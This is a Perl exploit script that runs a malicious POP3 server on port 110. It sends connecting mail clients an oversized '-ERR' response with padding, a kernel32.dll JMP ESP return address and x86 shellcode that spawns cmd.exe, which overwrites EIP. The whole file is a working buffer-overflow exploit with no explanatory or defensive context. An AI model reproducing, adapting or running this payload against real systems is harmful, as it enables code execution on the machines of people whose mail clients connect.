#!/usr/bin/perl

use IO::Socket;

$ret = 0x7C867877; # Jump ESP Kernel32.dll 0x7C867877

$port = 110;

# Simple cmd.exe

$sc2 = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC" .
"\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45" .
"\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45" .
"\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45" .
"\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3";

$serv = IO::Socket::INET->new(Proto=>'tcp',
LocalPort=>$port,
Listen=>1)
or die "Error: listen($port)\n";

$cli = $serv->accept() or die "Error: accept()\n";

$retaddr = pack('l', $ret);
$junk = "A" x 709;

$payload = "-ERR " . $junk . $retaddr . "\x90" x 1 . $sc2 . "\r\n"; # 714 to overwrite EIP

$cli->send($payload);

close($cli);
close($serv);

########################################################################
#############

